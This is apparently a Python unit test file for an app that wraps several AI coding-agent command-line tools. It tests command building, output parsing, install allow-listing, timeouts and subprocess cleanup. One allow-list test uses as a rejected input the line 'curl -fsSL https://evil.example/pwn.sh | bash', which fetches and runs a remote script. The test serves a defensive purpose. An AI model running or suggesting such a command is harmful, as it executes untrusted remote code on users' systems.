import asyncio
import json
import sys

import pytest

from app.api.admin import _is_allowed_install_recipe
from app.clients.agy import INSTALL_SCRIPT_COMMAND, AgyAdapter
from app.clients.claude import ClaudeAdapter
from app.clients.codex import CodexAdapter
from app.clients.commandcode import CommandCodeAdapter
from app.clients.generic import GenericAdapter, GenericAdapterConfig
from app.clients.opencode import OpenCodeAdapter
from app.core.config import settings
pytestmark = pytest.mark.unit


def test_claude_build_command_includes_model_and_resume():
    adapter = ClaudeAdapter()
    cmd = adapter.build_command("hello", model="sonnet", session_id="sess123")
    assert "sonnet" in cmd
    assert "sess123" in cmd
    assert "-p" in cmd


def test_claude_build_command_omits_default_model():
    adapter = ClaudeAdapter()
    cmd = adapter.build_command("hello", model="default")
    assert "--model" not in cmd


def test_codex_parse_line_extracts_text_field():
    adapter = CodexAdapter()
    line = json.dumps({"text": "hello world", "other": 123})
    text, meta = adapter.parse_line(line, "default")
    assert text == "hello world"
    assert meta["text"] == "hello world"


def test_codex_parse_line_falls_back_to_raw_on_invalid_json():
    adapter = CodexAdapter()
    text, meta = adapter.parse_line("not json", "default")
    assert text == "not json"
    assert meta == {}


def test_opencode_parse_line_extracts_text_part():
    adapter = OpenCodeAdapter()
    line = json.dumps({"type": "text", "part": {"text": "chunk"}, "text": "fallback"})
    text, meta = adapter.parse_line(line, "default")
    assert text == "chunk"


def test_commandcode_parse_line_handles_text_delta():
    adapter = CommandCodeAdapter()
    line = json.dumps({"event": {"type": "text_delta", "delta": "hi "}})
    text, meta = adapter.parse_line(line, "default")
    assert text == "hi "


def test_commandcode_parse_line_handles_result_final_text():
    adapter = CommandCodeAdapter()
    line = json.dumps({"type": "result", "finalText": "final answer"})
    text, meta = adapter.parse_line(line, "default")
    # streaming path suppresses finalText to avoid duplicate after incremental deltas
    assert text == ""
    assert meta.get("event") == "result"
    assert meta.get("finalText") == "final answer"
    # non-stream path still returns finalText via parse_output
    assert adapter.parse_output(line.encode(), "default") == "final answer"


def test_generic_adapter_from_params_and_config_equivalence():
    cfg = GenericAdapterConfig(name="myharness", executable="myexec", provider="p", command_template=["myexec", "{prompt}"])
    a1 = GenericAdapter(cfg)
    a2 = GenericAdapter.from_params(name="myharness", executable="myexec", provider="p", command_template=["myexec", "{prompt}"])
    assert a1.build_command("hello", model="m") == a2.build_command("hello", model="m")


def test_generic_adapter_build_command_substitutes_template():
    adapter = GenericAdapter.from_params(name="gen", executable="gen", command_template=["gen", "--prompt", "{prompt}", "--model", "{model}"])
    cmd = adapter.build_command("my prompt", model="my-model")
    assert cmd == ["gen", "--prompt", "my prompt", "--model", "my-model"]


def test_generic_adapter_defaults_template_to_executable_plus_prompt():
    adapter = GenericAdapter(GenericAdapterConfig(name="gen", executable="echo"))
    assert adapter.build_command("hi") == ["echo", "hi"]


def test_agy_uses_official_script_not_npm():
    adapter = AgyAdapter()
    assert adapter.install_command == ["bash", "-c", INSTALL_SCRIPT_COMMAND]
    assert "npm" not in adapter.install_command
    assert adapter.update_command == ["agy", "update"]


def test_agy_recipes_are_allow_listed():
    adapter = AgyAdapter()
    assert _is_allowed_install_recipe(adapter.install_command)


def test_install_recipe_text_renders_shell_script():
    adapter = AgyAdapter()
    assert adapter.install_recipe == INSTALL_SCRIPT_COMMAND
    assert adapter.update_recipe == "agy update"


def test_install_allow_list_accepts_npm_and_approved_script_only():
    assert _is_allowed_install_recipe(["npm", "install", "-g", "opencode-ai"])
    assert _is_allowed_install_recipe(["bash", "-c", INSTALL_SCRIPT_COMMAND])
    assert not _is_allowed_install_recipe([])
    assert not _is_allowed_install_recipe(["pip", "install", "something"])
    assert not _is_allowed_install_recipe(["bash", "-c", "curl -fsSL https://evil.example/pwn.sh | bash"])


def test_install_timeout_kills_hung_subprocess(monkeypatch):
    # Make a real subprocess that just sleeps, then force a tiny install budget.
    monkeypatch.setattr(settings, "harness_install_timeout_seconds", 1, raising=False)
    adapter = GenericAdapter(GenericAdapterConfig(name="hung", executable="sleep"))
    adapter.install_command = ["sleep", "30"]
    events = []
    async def _collect():
        async for ev in adapter.install():
            events.append(ev)
    asyncio.run(_collect())
    # we expect a "timed out" failure event with a clear message
    assert any(ev.get("stage") == "failed" and "timed out" in ev.get("message", "") for ev in events), events


def test_install_on_process_callback_receives_subprocess():
    # The on_process hook is what the job service uses to register the process
    # for later cancellation; verify it actually fires with a live Process.
    received = {}
    async def _hook(proc):
        received["proc"] = proc
    adapter = GenericAdapter(GenericAdapterConfig(name="fast", executable="true"))
    adapter.install_command = ["true"]
    async def _collect():
        async for _ in adapter.install(on_process=_hook):
            pass
    asyncio.run(_collect())
    assert "proc" in received
    assert received["proc"].returncode is not None  # 'true' exited cleanly


@pytest.mark.asyncio
async def test_stream_verbose_stderr_no_deadlock():
    # 128 KiB of stderr exceeds the default 64 KiB OS pipe buffer;
    # without concurrent background draining, this command would deadlock.
    cmd = "import sys; sys.stderr.write('E' * 131072); sys.stderr.flush(); print('tok1'); sys.stdout.flush(); print('tok2'); sys.stdout.flush()"
    adapter = GenericAdapter.from_params(name="verbose", executable=sys.executable, command_template=[sys.executable, "-c", cmd])
    tokens = []
    async for text, _ in adapter.stream("hi"):
        tokens.append(text.strip())
    assert "tok1" in tokens
    assert "tok2" in tokens


@pytest.mark.asyncio
async def test_stream_nonzero_exit_retains_bounded_diagnostics():
    cmd = "import sys; sys.stderr.write('HEAD_' + ('X' * 100000) + '_TAIL_DIAGNOSTIC\\n'); sys.stderr.flush(); sys.exit(42)"
    adapter = GenericAdapter.from_params(name="fail_verbose", executable=sys.executable, command_template=[sys.executable, "-c", cmd])
    with pytest.raises(RuntimeError) as exc_info:
        async for _ in adapter.stream("hi"):
            pass
    err_msg = str(exc_info.value)
    assert "failed (42)" in err_msg
    assert "TAIL_DIAGNOSTIC" in err_msg
    assert "HEAD_" not in err_msg
    # Retained diagnostics are capped at 64 KiB (+ small wrapper message)
    assert len(err_msg) <= 70000


@pytest.mark.asyncio
async def test_stream_cleanup_leaves_no_orphan_tasks_and_kills_process():
    cmd = "import sys, time; sys.stderr.write('err\\n'); sys.stderr.flush(); print('tok_live', flush=True); time.sleep(30)"
    adapter = GenericAdapter.from_params(name="cancel_test", executable=sys.executable, command_template=[sys.executable, "-c", cmd])
    gen = adapter.stream("hi")
    first = await gen.__anext__()
    assert first[0].strip() == "tok_live"
    await gen.aclose()

    # Verify no _drain task is still pending or running
    drain_tasks = [t for t in asyncio.all_tasks() if "_drain" in getattr(t.get_coro(), "__name__", "") and not t.done()]
    assert len(drain_tasks) == 0